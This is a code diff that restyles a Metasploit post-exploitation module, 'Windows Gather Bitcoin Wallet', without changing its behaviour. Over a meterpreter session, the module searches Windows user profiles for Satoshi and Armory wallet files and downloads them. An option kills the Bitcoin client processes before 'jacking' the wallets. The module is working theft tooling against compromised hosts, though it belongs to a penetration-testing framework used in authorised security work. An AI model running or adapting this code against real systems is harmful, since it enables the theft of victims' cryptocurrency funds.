@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,38 +9,36 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather Bitcoin Wallet',
-      'Description'   => %q{
-        This module downloads any Bitcoin wallet files from the target
-        system. It currently supports both the classic Satoshi wallet and the
-        more recent Armory wallets. Note that Satoshi wallets tend to be
-        unencrypted by default, while Armory wallets tend to be encrypted by default.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [
-        'illwill <illwill[at]illmob.org>', # Original implementation
-        'todb' # Added Armory support
-      ],
-      'Platform'      => [ 'win' ], # TODO: Several more platforms host Bitcoin wallets...
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather Bitcoin Wallet',
+                      'Description'   => %q(
+                        This module downloads any Bitcoin wallet files from the target
+                        system. It currently supports both the classic Satoshi wallet and the
+                        more recent Armory wallets. Note that Satoshi wallets tend to be
+                        unencrypted by default, while Armory wallets tend to be encrypted by default.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [
+                        'illwill <illwill[at]illmob.org>', # Original implementation
+                        'todb' # Added Armory support
+                      ],
+                      'Platform'      => [ 'win' ], # TODO: Several more platforms host Bitcoin wallets...
+                      'SessionTypes'  => [ 'meterpreter' ]))
 
     register_options([
-      OptBool.new('KILL_PROCESSES', [false, 'Kill associated Bitcoin processes before jacking.', false]),
-    ], self.class)
+                       OptBool.new('KILL_PROCESSES', [false, 'Kill associated Bitcoin processes before jacking.', false])
+                     ], self.class)
   end
 
   def run
     print_status("Checking all user profiles for Bitcoin wallets...")
     found_wallets = false
-    grab_user_profiles().each do |user|
+    grab_user_profiles.each do |user|
       next unless user['AppData']
       bitcoin_wallet_path = user['AppData'] + "\\Bitcoin\\wallet.dat"
       next unless file?(bitcoin_wallet_path)
@@ -53,9 +52,7 @@ class MetasploitModule < Msf::Post
         jack_wallet(armory_wallet_fullpath)
       end
     end
-    unless found_wallets
-      print_warning "No wallets found, nothing to do."
-    end
+    print_warning "No wallets found, nothing to do." unless found_wallets
   end
 
   def jack_wallet(wallet_path)
@@ -102,14 +99,12 @@ class MetasploitModule < Msf::Post
   end
 
   def kill_bitcoin_processes
-    client.sys.process.get_processes().each do |process|
+    client.sys.process.get_processes.each do |process|
       pname = process['name'].downcase
-      if pname == "bitcoin.exe" || pname == "bitcoind.exe" || pname == "armoryqt.exe"
-        print_status("#{process['name']} Process Found...")
-        print_status("Killing Process ID #{process['pid']}...")
-        session.sys.process.kill(process['pid'])
-      end
+      next unless pname == "bitcoin.exe" || pname == "bitcoind.exe" || pname == "armoryqt.exe"
+      print_status("#{process['name']} Process Found...")
+      print_status("Killing Process ID #{process['pid']}...")
+      session.sys.process.kill(process['pid'])
     end
   end
-
 end
